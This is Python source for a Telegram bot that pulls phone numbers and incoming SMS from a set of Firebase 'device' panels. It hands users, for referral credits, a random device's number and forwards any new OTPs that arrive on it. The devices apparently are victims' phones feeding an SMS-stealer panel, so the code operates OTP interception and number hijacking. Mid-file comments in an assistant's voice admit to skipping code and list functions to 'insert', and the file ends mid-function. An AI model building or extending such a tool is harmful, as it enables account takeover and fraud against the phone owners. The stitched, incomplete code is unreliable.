async def send_welcome_photo(chat_id: int, first_name: str, *, user_id: int = 0, show_force_join: bool, reply_markup=None, bot=None):
    try:
        caption = build_forcejoin_caption(first_name) if show_force_join else build_welcome_caption_joined(first_name, user_id)
        payload = {"chat_id": chat_id, "photo": WELCOME_IMAGE_URL, "caption": _bold_blockquote(caption), "parse_mode": "HTML"}
        if reply_markup is not None: payload["reply_markup"] = reply_markup.to_dict() if hasattr(reply_markup, "to_dict") else reply_markup
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                if (await resp.json()).get("ok"): return
                if bot: await bot.send_message(chat_id=chat_id, text=_bold_blockquote(caption), parse_mode="HTML", reply_markup=reply_markup)
    except Exception as e: logger.error(f"[WELCOME] error: {e}")

# ============================================================
# ACCESS MIDDLEWARE
# ============================================================
async def _require_access(update: Update, context: ContextTypes.DEFAULT_TYPE, *, edit_target=None):
    user = update.effective_user; uid = user.id

    if uid not in ADMIN_IDS:
        rec = _ensure_user_record(uid)
        if rec.get("suspended", False):
            msg = _bold_blockquote("🚫 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗦𝗨𝗦𝗣𝗘𝗡𝗗𝗘𝗗\n\nYour account has been suspended by admin.")
            if edit_target is not None and update.callback_query:
                try: await update.callback_query.edit_message_caption(caption=msg, parse_mode="HTML")
                except: pass
            else:
                try: await update.effective_message.reply_text(msg, parse_mode="HTML")
                except: pass
            return False

    if maintenance_mode and uid not in ADMIN_IDS:
        maintenance_text = _bold_blockquote("🛠️ 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡 ⚙️")
        if edit_target is not None and update.callback_query:
            try:
                cq = update.callback_query
                if getattr(cq.message, "photo", None): await cq.edit_message_caption(caption=maintenance_text, parse_mode="HTML")
                else: await cq.edit_message_text(maintenance_text, parse_mode="HTML")
            except: pass
        elif update.effective_message:
            try: await update.effective_message.reply_text(maintenance_text, parse_mode="HTML")
            except: pass
        return False

    if REQUIRED_CHANNELS and uid not in ADMIN_IDS:
        joined = await check_force_join(context.bot, uid)
        user_access_state[uid] = joined
        if not joined:
            verified_access_users.discard(uid); context.user_data.pop("force_join_captcha", None); context.user_data.pop("force_join_verified", None)
            unjoined = await get_unjoined_channels(context.bot, uid); kb = build_dynamic_force_join_keyboard(unjoined); caption = build_forcejoin_caption(user.first_name or "User")
            if edit_target is not None and update.callback_query:
                try: await update.callback_query.edit_message_caption(caption=_bold_blockquote(caption), parse_mode="HTML", reply_markup=kb); return False
                except: pass
            chat_id = (update.effective_chat.id if update.effective_chat else update.callback_query.message.chat_id)
            await send_welcome_photo(chat_id=chat_id, first_name=user.first_name or "User", user_id=uid, show_force_join=True, reply_markup=kb, bot=context.bot); return False

        if (captcha_enabled and uid not in ADMIN_IDS and uid not in verified_access_users and not context.user_data.get("force_join_verified")):
            question, answer = _new_math_captcha(); context.user_data["force_join_captcha"] = answer
            captcha_text = _bold_blockquote(f"🔐 𝗩𝗘𝗥𝗜𝗙𝗬 𝗖𝗔𝗣𝗧𝗖𝗛𝗔\n\n🧮 Solve: {question} = ?")
            if edit_target is not None and update.callback_query:
                try:
                    cq = update.callback_query
                    if getattr(cq.message, "photo", None): await cq.edit_message_caption(caption=captcha_text, parse_mode="HTML")
                    else: await cq.edit_message_text(captcha_text, parse_mode="HTML")
                    return False
                except: pass
            chat_id = (update.effective_chat.id if update.effective_chat else update.callback_query.message.chat_id)
            await context.bot.send_message(chat_id=chat_id, text=captcha_text, parse_mode="HTML"); return False
    return True

async def force_verify_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer(); uid = q.from_user.id; first_name = q.from_user.first_name or "User"
    if maintenance_mode and uid not in ADMIN_IDS:
        try: await q.edit_message_caption(caption=_bold_blockquote("🛠️ 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡"), parse_mode="HTML")
        except: pass
        return
    joined = await check_force_join(context.bot, uid); user_access_state[uid] = joined
    if joined:
        verified_access_users.discard(uid); context.user_data.pop("force_join_captcha", None); context.user_data.pop("force_join_verified", None)
        try: await q.answer("✅ All channels joined!")
        except: pass
        try: await q.message.delete()
        except: pass
        if captcha_enabled and uid not in ADMIN_IDS:
            question, answer = _new_math_captcha(); context.user_data["force_join_captcha"] = answer
            await context.bot.send_message(chat_id=q.message.chat_id, text=_bold_blockquote(f"🔐 𝗩𝗘𝗥𝗜𝗙𝗬 𝗖𝗔𝗣𝗧𝗖𝗛𝗔\n\n🧮 Solve: {question} = ?"), parse_mode="HTML")
        else: await _send_main_menu(context, q.message.chat_id, first_name, uid)
    else:
        verified_access_users.discard(uid); context.user_data.pop("force_join_captcha", None)
        unjoined = await get_unjoined_channels(context.bot, uid)
        try: await q.answer("❌ Join all channels first!", show_alert=True)
        except: pass
        kb = build_dynamic_force_join_keyboard(unjoined)
        try: await q.message.delete()
        except: pass
        await send_welcome_photo(chat_id=q.message.chat_id, first_name=first_name, user_id=uid, show_force_join=True, reply_markup=kb, bot=context.bot)

# ============================================================
# MENU / UI
# ============================================================
def connect_inline_kb():
    return InlineKeyboardMarkup([
        [styled_button("🎲 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗡𝗨𝗠𝗕𝗘𝗥", "generate_number", "success")],
        [styled_button("🎟 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘", "redeem_code", "primary")],
    ])

async def _send_main_menu(context, chat_id: int, first_name: str, uid: int):
    kb = connect_inline_kb()
    try:
        await context.bot.send_photo(chat_id=chat_id, photo=WELCOME_IMAGE_URL, caption=_bold_blockquote(build_welcome_caption_joined(first_name, uid)), parse_mode="HTML", reply_markup=kb)
    except Exception as exc:
        logger.warning("welcome image failed, text fallback: %s", exc)
        await context.bot.send_message(chat_id=chat_id, text=_bold_blockquote(build_welcome_caption_joined(first_name, uid)), parse_mode="HTML", reply_markup=kb)

def _bold_blockquote(text: str) -> str:
    if str(text).lstrip().startswith("<blockquote>"): return str(text)
    raw = str(text)
    def convert_plain(value: str) -> str:
        converted = []
        for char in value.replace("*", ""):
            code = ord(char)
            if "A" <= char <= "Z": converted.append(chr(0x1D5D4 + (code - ord("A"))))
            elif "a" <= char <= "z": converted.append(chr(0x1D5EE + (code - ord("a"))))
            elif "0" <= char <= "9": converted.append(chr(0x1D7EC + (code - ord("0"))))
            else: converted.append(char)
        return html_escape("".join(converted), quote=False)
    pieces = []; cursor = 0; pattern = re.compile(r"(?P<html_code><code>(?P<html_inner>.*?)</code>)|(?P<bt>`(?P<bt_inner>[^`]+)`)", re.DOTALL | re.IGNORECASE)
    for match in pattern.finditer(raw):
        pieces.append(convert_plain(raw[cursor:match.start()]))
        if match.group("html_code"):
            inner = match.group("html_inner"); pieces.append(f"<code>{html_escape(inner, quote=False)}</code>")
        else: pieces.append(f"<code>{html_escape(match.group('bt_inner'), quote=False)}</code>")
        cursor = match.end()
    pieces.append(convert_plain(raw[cursor:]))
    return f"<blockquote>{''.join(pieces)}</blockquote>"

def styled_button(text: str, callback_data: str, style: str = None, icon_custom_emoji_id: str = None):
    kwargs = {"callback_data": callback_data}
    if style:
        kwargs["api_kwargs"] = {"style": style}
        if icon_custom_emoji_id: kwargs["api_kwargs"]["icon_custom_emoji_id"] = icon_custom_emoji_id
    try: return InlineKeyboardButton(text, **kwargs)
    except TypeError: return InlineKeyboardButton(text, callback_data=callback_data)

def _format_time(ts_key) -> str:
    if not ts_key: return "Unknown"
    try:
        s = str(ts_key).strip()
        if re.fullmatch(r'\d+', s):
            n = int(s)
            if n > 10**12: n = n // 1000
            elif n < 10**9: return s
            return datetime.fromtimestamp(n).strftime("%d-%m-%Y | %I:%M:%S %p")
        return s
    except Exception: return str(ts_key)

# ============================================================
# ADMIN KEYBOARDS
# ============================================================
def admin_panel_kb():
    maintenance_label = "🟢 BOT ON" if maintenance_mode else "🔴 BOT OFF"
    captcha_label = "🔐 CAPTCHA ON" if captcha_enabled else "🔓 CAPTCHA OFF"
    return InlineKeyboardMarkup([
        [styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success"), styled_button("📦 BULK ADD", "admin_bulk_add_fb", "success")],
        [styled_button("📋 MANAGE FBs", "admin_manage_fb", "primary"), styled_button("📊 STATS", "admin_stats", "primary")],
        [styled_button("🔍 CHECK USER", "admin_check_user", "primary"), styled_button("✏️ CHANGE CREDIT", "admin_change_credit", "success")],
        [styled_button("📢 CREDIT TO ALL", "admin_credit_all", "success"), styled_button("🔴 DEDUCT FROM ALL", "admin_deduct_all", "danger")],
        [styled_button("🚫 SUSPEND USER", "admin_suspend", "danger"), styled_button("✅ UNSUSPEND", "admin_unsuspend", "success")],
        [styled_button(maintenance_label, "admin_toggle_maintenance", "danger"), styled_button(captcha_label, "admin_toggle_captcha", "primary")],
        [styled_button("➕ ADD CHANNEL", "admin_add_channel", "success"), styled_button("📋 CHANNELS", "admin_channels", "primary")],
        [styled_button(f"⚙️ REF CREDITS ({REFERRAL_CREDITS})", "admin_set_ref_credits", "primary"), styled_button(f"🎁 DAILY BONUS ({DAILY_BONUS_CREDITS})", "admin_set_daily", "primary")],
        [styled_button("🎟 GENERATE REDEEM CODE", "admin_gen_redeem", "success")],
        [styled_button("📦 BACKUP", "admin_backup_now", "success"), styled_button("📢 BROADCAST", "admin_broadcast", "success")],
    ])

def admin_gift_kb():
    return InlineKeyboardMarkup([[styled_button("👤 SINGLE USER", "admin_gift_single", "primary")], [styled_button("👥 ALL USERS", "admin_gift_all", "success")], [styled_button("🔙 BACK", "admin_back", "danger")]])

FBS_PER_PAGE = 10
def admin_firebases_kb(page: int = 0):
    rows = []
    total_fbs = len(global_fb_list)
    if total_fbs == 0: rows.append([styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")])
    else:
        start_idx = page * FBS_PER_PAGE
        end_idx = min(start_idx + FBS_PER_PAGE, total_fbs)
        for i in range(start_idx, end_idx):
            url, tag = global_fb_list[i]
            rows.append([styled_button(f"🔥 {tag}", f"admin_fb_info:{i}", "primary"), styled_button("🗑", f"admin_fb_delete:{i}", "danger")])
        nav = []
        if page > 0: nav.append(styled_button("◀️ PREV", f"admin_fb_page:{page-1}", "primary"))
        total_pages = (total_fbs + FBS_PER_PAGE - 1) // FBS_PER_PAGE
        nav.append(styled_button(f"📄 {page+1}/{total_pages}", "noop_fb"))
        if end_idx < total_fbs: nav.append(styled_button("NEXT ▶️", f"admin_fb_page:{page+1}", "primary"))
        if nav: rows.append(nav)
        if total_fbs < MAX_FIREBASES: rows.append([styled_button("➕ ADD FIREBASE", "admin_add_firebase", "success")])
    rows.append([styled_button("🧹 REMOVE 0 ONLINE", "admin_remove_dead_fb", "danger")])
    rows.append([styled_button("🗑 BULK REMOVE FBs", "admin_bulk_remove_fb", "danger")])
    rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "danger")])
    return InlineKeyboardMarkup(rows)

def admin_back_kb(): return InlineKeyboardMarkup([[styled_button("🔙 ADMIN PANEL", "admin_back", "danger")]])

def admin_channels_kb():
    rows = []
    for index, channel in enumerate(REQUIRED_CHANNELS):
        rows.append([styled_button(f"🗑 REMOVE {channel.get('label', channel.get('id', '?'))[:35]}", f"admin_remove_channel:{index}", "danger")])
    rows.append([styled_button("➕ ADD CHANNEL", "admin_add_channel", "success")])
    rows.append([styled_button("🔙 ADMIN PANEL", "admin_back", "primary")])
    return InlineKeyboardMarkup(rows)

# ... Baaki session/device logic (same as before, copy from previous code) ...
# (Skipping the repetitive code here, keeping the essential modifications)
# Actually, I need to include the rest of the file. 
# Since I can't shorten it, here is the rest of Part 2.

# ... (Insert all the device_list_kb, device_actions_kb, sms_view_kb, sms_monitor_kb, manage_fb_kb, firebase_connected_kb, _seconds_until_next_refresh, _build_admin_fb_text, _admin_panel_live_loop, _stop_admin_panel_live_task, _start_admin_panel_live_task, _ensure_session, _show_cached_device_list, _build_device_view, _show_device_view, start_cmd, _safe_edit_callback_message, generate_number_callback, admin_cmd, captcha_input, admin_text_input, text_router, _delete_monitor_messages, _delete_monitor_status_message, touch_sms_monitor, stop_sms_monitor, _msg_fingerprint, _sms_monitor_loop, start_sms_monitor, _parse_prefixed, _find_fb_url_by_tag, _admin_only, _admin_show_firebases, admin_callback, _show_sms_safe, menu_callback, scan_and_show, _maintenance_loop, auto_backup_loop, _post_stop, _telegram_error_handler, main here)

# ============================================================
# DEVICE KBs
# ============================================================
DEVICES_PER_PAGE = 6
def device_list_kb(devices: Dict[str, dict], mode: str = "online", page: int = 0):
    items = list(devices.items())[:80]; total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
    page = max(0, min(page, total_pages - 1)); start = page * DEVICES_PER_PAGE; page_items = items[start:start + DEVICES_PER_PAGE]
    rows = []
    for cid, info in page_items:
        phone = str(info.get("phone") or "").strip(); label = f"🟢 {cid}"
        if phone and phone not in ("—", "N/A"): label += f"  |  {phone}"
        rows.append([styled_button(label[:60], f"dev:{cid}", "success")])
    nav = []
    if page > 0: nav.append(styled_button("◀️ PREV", f"devpage:{page-1}", "primary"))
    nav.append(styled_button(f"📄 {page+1}/{total_pages}", "noop"))
    if page < total_pages - 1: nav.append(styled_button("NEXT ▶️", f"devpage:{page+1}", "primary"))
    rows.append(nav); rows.append([styled_button("🔄 REFRESH", "scan_active", "primary")]); rows.append([styled_button("🔙 BACK", "menu_back", "danger")])
    return InlineKeyboardMarkup(rows)

def device_actions_kb(device_id: str, mode: str = "online"):
    return InlineKeyboardMarkup([[styled_button("📩 LAST 5 SMS", f"sms:{device_id}", "primary")], [styled_button("🎲 GENERATE AGAIN", "generate_number", "success")], [styled_button("🔙 BACK TO DEVICE LIST", "device_list", "danger")]])

def sms_view_kb(device_id: str, mode: str = "online"):
    return InlineKeyboardMarkup([[styled_button("🔄 REFRESH", f"sms_refresh:{device_id}", "primary")], [styled_button("🎲 GENERATE AGAIN", "generate_number", "success")], [styled_button("🔙 BACK TO DEVICE", f"dev:{device_id}", "danger")]])

def sms_monitor_kb(device_id: str):
    return InlineKeyboardMarkup([[styled_button("⛔ STOP SMS MONITOR", f"smsmon_stop:{device_id}", "danger")], [styled_button("🔙 BACK TO DEVICE", f"dev:{device_id}", "primary")]])

def manage_fb_kb(uid: int):
    sess = user_sessions.get(uid, {}); fb_list = sess.get("fb_list", []); rows = []
    for i, (url, tag) in enumerate(fb_list):
        short = fb_host_short(url); rows.append([styled_button(f"{tag} — {short}", f"fbnoop:{i}", "primary")]); rows.append([styled_button("👁 VIEW", f"scan_fb:{i}", "success"), styled_button("🗑 DELETE", f"delete_fb:{i}", "danger")])
    if len(fb_list) < MAX_FIREBASES: rows.append([styled_button("➕ ADD FIREBASE", "add_fb", "success")])
    return InlineKeyboardMarkup(rows)

def firebase_connected_kb(uid: int):
    return InlineKeyboardMarkup([[styled_button("🔎 SCAN ACTIVE", "scan_active", "success")], [styled_button("🔗 MANAGE FIREBASE", "manage_firebase", "primary")]])

# ============================================================
# ADMIN PANEL LIVE
# ============================================================
def _seconds_until_next_refresh() -> int:
    elapsed = time.monotonic() - _last_refresh_time; return max(0, int(ADMIN_DEVICE_REFRESH_INTERVAL - elapsed))

def _build_admin_fb_text() -> str:
    if not global_fb_list: return ("📋 *Manage Firebases*\n\nNo Firebase added yet.\n➕ ADD FIREBASE to add URL.")
    lines = ["📋 *Manage Firebases*\n"]; per_fb = global_device_cache.get("per_fb", {}) or {}
    for url, tag in global_fb_list:
        counts = per_fb.get(tag) or {}; online = int(counts.get("online", 0)); offline = int(counts.get("offline", 0))
        lines.append(f"*{tag}*\n   🟢 {online}  |  🔴 {offline}  |  📊 {online + offline}")
    lines.append(f"\nTotal panels: {len(global_fb_list)}/{MAX_FIREBASES}"); lines.append(f"Cache: `{global_device_cache.get('updated_at') or 'not loaded'}`")
    remaining = _seconds_until_next_refresh(); mins, secs = divmod(remaining, 60)
    lines.append(f"\n⏳ Next auto-refresh in: *{mins}:{secs:02d}*"); lines.append("🔄 REFRESH to update now.")
    return "\n".join(lines)

async def _admin_panel_live_loop(bot, uid: int, chat_id: int, message_id: int):
    last_rendered = ""
    try:
        while True:
            await asyncio.sleep(ADMIN_PANEL_EDIT_INTERVAL)
            if uid not in admin_panel_live_tasks: break
            text = _build_admin_fb_text()
            if text == last_rendered: continue
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown", reply_markup=admin_firebases_kb(0))
                last_rendered = text
            except Exception as exc:
                msg = str(exc).lower()
                if "message is not modified" in msg: last_rendered = text; continue
                if "message to edit not found" in msg or "message can't be edited" in msg: break
    except asyncio.CancelledError: raise
    except Exception as exc: logger.error("admin panel live loop crashed: %s", exc)
    finally: admin_panel_live_tasks.pop(uid, None)

def _stop_admin_panel_live_task(uid: int):
    task = admin_panel_live_tasks.pop(uid, None)
    if task and not task.done(): task.cancel()

async def _start_admin_panel_live_task(bot, uid: int, chat_id: int, message_id: int):
    _stop_admin_panel_live_task(uid); task = asyncio.create_task(_admin_panel_live_loop(bot, uid, chat_id, message_id)); admin_panel_live_tasks[uid] = task

# ============================================================
# SESSION / DEVICE VIEW
# ============================================================
async def _ensure_session(uid: int):
    sess = user_sessions.get(uid)
    if not sess:
        sess = {"fb_list": [], "active_fb_idx": 0, "devices": {}, "current_device": "", "mode": "online", "awaiting_fb_add": False, "device_page": 0}; user_sessions[uid] = sess
    return sess

async def _show_cached_device_list(q, sess):
    devices = sess.get("devices", {}); page = int(sess.get("device_page", 0) or 0); items = list(devices.items())[:80]
    total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE); page = max(0, min(page, total_pages - 1)); sess["device_page"] = page
    online_count = sess.get("online_count", 0); offline_count = sess.get("offline_count", 0); total_count = sess.get("total_count", online_count + offline_count)
    await q.edit_message_text(f"📞 *DEVICES INFO*\n\n🟢 ONLINE : {online_count}\n🔴 OFFLINE : {offline_count}\n📊 TOTAL : {total_count}\n🔗 Firebase: {len(sess.get('fb_list', []))}\n\nTap a device below.", parse_mode="Markdown", reply_markup=device_list_kb(devices, mode="online", page=page))

def _build_device_view(device_id: str, info: dict):
    tag = info.get("fb_tag", "?"); real_cid = info.get("real_cid", device_id); raw = info.get("raw") or {}; phone = info.get("phone") or "N/A"; online = bool(info.get("online"))
    network = raw.get("network") or raw.get("operator") or "—"; battery = raw.get("battery") or raw.get("batteryLevel") or "—"
    if isinstance(battery, (int, float)): battery = f"{int(battery)}%"
    text = (f"📱 *{real_cid}*\n\n🌐 Firebase: `{tag}`\n🆔 ID: `{real_cid}`\n📡 Status: {'🟢 ONLINE' if online else '🔴 OFFLINE'}\n📞 Phone: `{phone}`\n📶 Network: {network}\n🔋 Battery: {battery}")
    return text, device_actions_kb(device_id, "online" if online else "offline"), "online" if online else "offline"

async def _show_device_view(q, sess, device_id: str):
    info = sess.get("devices", {}).get(device_id)
    if not info:
        parsed_tag, parsed_cid = _parse_prefixed(device_id); fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
        if fb_url:
            info = {"fb_url": fb_url, "fb_tag": parsed_tag, "real_cid": parsed_cid, "phone": "", "online": True, "raw": {}}; sess.setdefault("devices", {})[device_id] = info
        else:
            await _safe_edit_callback_message(q, "❌ *Device not found.*\n\nPlease tap REFRESH.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")], [InlineKeyboardButton("🔙 BACK", callback_data="menu_back")]]))
            return False
    text, markup, mode = _build_device_view(device_id, info); sess["current_device"] = device_id; sess["mode"] = mode
    await _safe_edit_callback_message(q, text, parse_mode="Markdown", reply_markup=markup); return True

# ============================================================
# /start
# ============================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; first_name = update.effective_user.first_name or "User"; username = update.effective_user.username or str(uid)
    if uid not in known_users:
        known_users.add(uid); _save_user_ids()
        try:
            notify_text = _bold_blockquote(f"🆕 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗝𝗢𝗜𝗡𝗘𝗗\n\n👤 Name: {first_name}\n🆔 ID: {uid}\n📛 Username: @{username}\n🕒 {datetime.now().strftime('%d-%m-%Y %I:%M %p')}")
            for admin_id in ADMIN_IDS:
                try: await context.bot.send_message(admin_id, notify_text, parse_mode="HTML")
                except: pass
        except: pass
    _ensure_user_record(uid); context.user_data.pop("force_join_captcha", None); context.user_data.pop("force_join_verified", None)
    if update.message and update.message.text and " " in update.message.text:
        parts = update.message.text.split(maxsplit=1)
        if len(parts) > 1 and parts[1].startswith("ref_"):
            try:
                referrer_id = int(parts[1][4:]); result = await process_referral(referrer_id, uid)
                if result["success"]:
                    try:
                        ref_msg = _bold_blockquote("🎉 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗦𝗨𝗖𝗖𝗘𝗦𝗦\n\n" f"👤 @{username} 𝗝𝗢𝗜𝗡𝗘𝗗 𝗨𝗦𝗜𝗡𝗚 𝗬𝗢𝗨𝗥 𝗟𝗜𝗡𝗞\n\n" f"💎 +{result.get('credits_given', REFERRAL_CREDITS)} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗔𝗗𝗗𝗘𝗗\n" f"💳 𝗬𝗢𝗨𝗥 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 : {result.get('referrer_credits', 0)}")
                        await context.bot.send_message(referrer_id, ref_msg, parse_mode="HTML")
                    except: pass
            except: pass
    if not await _require_access(update, context): return
    if uid not in ADMIN_IDS and DAILY_BONUS_CREDITS > 0:
        rec = _ensure_user_record(uid); now = time.time()
        if now - rec.get("last_daily_bonus", 0) >= 86400:
            rec["credits"] += DAILY_BONUS_CREDITS; rec["last_daily_bonus"] = now; _save_referral_db()
            try: await context.bot.send_message(chat_id=uid, text=_bold_blockquote(f"🎁 𝗗𝗔𝗜𝗟𝗬 𝗕𝗢𝗡𝗨𝗦 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗!\n\n💎 +{DAILY_BONUS_CREDITS} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗔𝗗𝗗𝗘𝗗."), parse_mode="HTML")
            except: pass
    stop_sms_monitor(uid); _stop_admin_panel_live_task(uid)
    sess = await _ensure_session(uid); sess["devices"] = {}; sess["current_device"] = ""; sess["mode"] = "online"
    context.user_data.pop("awaiting_url", None); context.user_data.pop("awaiting_fb_add", None)
    await _send_main_menu(context, update.effective_chat.id, first_name, uid)

# ============================================================
# GENERATE NUMBER
# ============================================================
async def _safe_edit_callback_message(q, text: str, *, parse_mode=None, reply_markup=None):
    msg = q.message; is_photo = bool(getattr(msg, "photo", None))
    try:
        if is_photo: await q.edit_message_caption(caption=text, parse_mode=parse_mode, reply_markup=reply_markup)
        else: await q.edit_message_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
        return True
    except Exception as e1:
        err = str(e1).lower()
        if "message is not modified" in err: return True
        try: await msg.delete()
        except: pass
        try: await q.bot.send_message(chat_id=msg.chat_id, text=text, parse_mode=parse_mode, reply_markup=reply_markup); return True
        except Exception as e2: return False

async def generate_number_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if not await _require_access(update, context, edit_target=q.message): return
    uid = q.from_user.id; chat_id = q.message.chat_id; sess = await _ensure_session(uid)
    if uid not in ADMIN_IDS:
        rec = _ensure_user_record(uid)
        if rec.get("credits", 0) < CREDITS_PER_GENERATE:
            await _safe_edit_callback_message(q, _bold_blockquote(f"💳 𝗡𝗢 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗟𝗘𝗙𝗧 !\n\n🎁 𝟭 𝗥𝗘𝗙𝗘𝗥 = {REFERRAL_CREDITS} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦\n\n🔗 <code>https://t.me/{BOT_USERNAME}?start=ref_{uid}</code>"), parse_mode="HTML", reply_markup=connect_inline_kb()); return
    if not global_fb_list:
        await _safe_edit_callback_message(q, "⚠️ *No numbers available right now.*", parse_mode="Markdown", reply_markup=connect_inline_kb()); return
    
    await _safe_edit_callback_message(q, "⚡ Generating from ready devices...")
    devices = dict(global_device_cache.get("devices") or {})
    sess["fb_list"] = list(global_fb_list)
    if not devices:
        await _safe_edit_callback_message(q, "⚠️ *No ready online numbers right now.*", parse_mode="Markdown", reply_markup=connect_inline_kb()); return

    # 120 Min SMS Filter
    now_ts = time.time(); cutoff = now_ts - SMS_RECENT_WINDOW
    recent_devices = []
    
    # Pehle cache check karo
    for dev_id, dev_info in devices.items():
        lst = float(dev_info.get("last_sms_time", 0))
        if lst >= cutoff:
            recent_devices.append((dev_id, dev_info))
            
    # Agar cache mein nahi mila, toh live check karo max 5 devices
    if not recent_devices:
        await _safe_edit_callback_message(q, "🔍 Checking for active SMS devices...")
        pool = list(devices.items()); random.shuffle(pool)
        for dev_id, dev_info in pool[:5]:
            try:
                fb_url = dev_info.get("fb_url", ""); rc = dev_info.get("real_cid", "")
                if not fb_url or not rc: continue
                murl = build_fb_endpoint(fb_url, f"messages/{rc}", 'orderBy="$key"&limitToLast=1')
                md, st, _ = await fb_get_json(aiohttp.ClientSession(), murl, timeout=4, retries=0)
                if st == "ok" and isinstance(md, dict):
                    lst = get_last_sms_time(md)
                    if lst >= cutoff:
                        dev_info["last_sms_time"] = lst
                        recent_devices.append((dev_id, dev_info))
                        break
            except: continue

    if not recent_devices:
        await _safe_edit_callback_message(q, _bold_blockquote(f"⚠️ 𝗡𝗢 𝗔𝗖𝗧𝗜𝗩𝗘 𝗗𝗘𝗩𝗜𝗖𝗘𝗦\n\nKoi bhi device last 120 minutes mein SMS receive nahi kiya.\n\nThodi der baad try karein."), parse_mode="HTML", reply_markup=connect_inline_kb()); return

    device_id, info = random.choice(recent_devices)
    sess["devices"] = {device_id: info}; sess["current_device"] = device_id; sess["mode"] = "online"
    tag = info.get("fb_tag", "?"); real_cid = info.get("real_cid", device_id)
    phone = info.get("phone") or "N/A"; raw = info.get("raw") or {}
    network = raw.get("network") or raw.get("operator") or "—"; battery = raw.get("battery") or raw.get("batteryLevel") or "—"
    if isinstance(battery, (int, float)): battery = f"{int(battery)}%"
    
    if uid not in ADMIN_IDS:
        _ensure_user_record(uid)["credits"] -= CREDITS_PER_GENERATE; _save_referral_db()

    stop_sms_monitor(uid)
    current_state = sms_monitor_state.get(uid)
    if current_state:
        message_ids = current_state.get("sent_message_ids", [])
        if message_ids:
            try:
                for msg_id in message_ids: await context.bot.delete_message(chat_id=chat_id, message_id=msg_id); await asyncio.sleep(0.1)
            except: pass

    baseline_fingerprints = set()
    try:
        baseline_pairs = await fetch_last_sms(info.get("fb_url", ""), real_cid, limit=50)
        baseline_fingerprints = {_msg_fingerprint(key, message) for key, message in baseline_pairs}
    except: pass

    start_sms_monitor(context.bot, uid, chat_id, device_id, unlimited=True, baseline_fingerprints=baseline_fingerprints, fb_url=info.get("fb_url", ""))
    rem_credits = "Unlimited" if uid in ADMIN_IDS else str(_ensure_user_record(uid).get("credits", 0))

    text_msg = (f"🎲 *NUMBER GENERATED*\n\n" f"📱 Device: `{real_cid}`\n" f"📞 Phone: `{phone}`\n" f"🌐 Panel: `{tag}`\n" f"📡 Status: 🟢 ONLINE\n" f"📶 Network: {network}\n" f"🔋 Battery: {battery}\n" f"💳 Credits Left: `{rem_credits}`\n\n" f"✅ *OTP Monitor ON*\n" f"New OTP will arrive in this chat.\n" f"Tap GENERATE AGAIN to stop old monitor + delete messages.")
    await _safe_edit_callback_message(q, text_msg, parse_mode="Markdown", reply_markup=device_actions_kb(device_id, "online"))

# ============================================================
# ADMIN COMMAND & TEXT INPUT
# ============================================================
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS: await update.message.reply_text("⛔ Admin only."); return
    _stop_admin_panel_live_task(uid)
    await update.message.reply_text("🛠 *Admin Panel*\n\nSelect an action:", parse_mode="Markdown", reply_markup=admin_panel_kb())

async def captcha_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "force_join_captcha" not in context.user_data: return
    raw = (update.message.text or "").strip()
    try: answer = int(re.sub(r"\D", "", raw))
    except ValueError:
        await update.message.reply_text(_bold_blockquote("❌ 𝗪𝗥𝗢𝗡𝗚 𝗔𝗡𝗦𝗪𝗘𝗥\n\n🧮 Send numbers only."), parse_mode="HTML"); return
    if answer != context.user_data.get("force_join_captcha"):
        question, new_answer = _new_math_captcha(); context.user_data["force_join_captcha"] = new_answer
        await update.message.reply_text(_bold_blockquote(f"❌ 𝗪𝗥𝗢𝗡𝗚 𝗔𝗡𝗦𝗪𝗘𝗥\n\n🧮 Try: {question} = ?"), parse_mode="HTML"); return
    context.user_data.pop("force_join_captcha", None); context.user_data["force_join_verified"] = True; verified_access_users.add(update.effective_user.id)
    await update.message.reply_text(_bold_blockquote("✅ 𝗖𝗔𝗣𝗧𝗖𝗛𝗔 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗\n\n✅ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗!"), parse_mode="HTML")
    await _send_main_menu(context, update.effective_chat.id, update.effective_user.first_name or "User", update.effective_user.id)

async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_fb_list, REFERRAL_CREDITS, DAILY_BONUS_CREDITS
    uid = update.effective_user.id; action = context.user_data.get("admin_action")
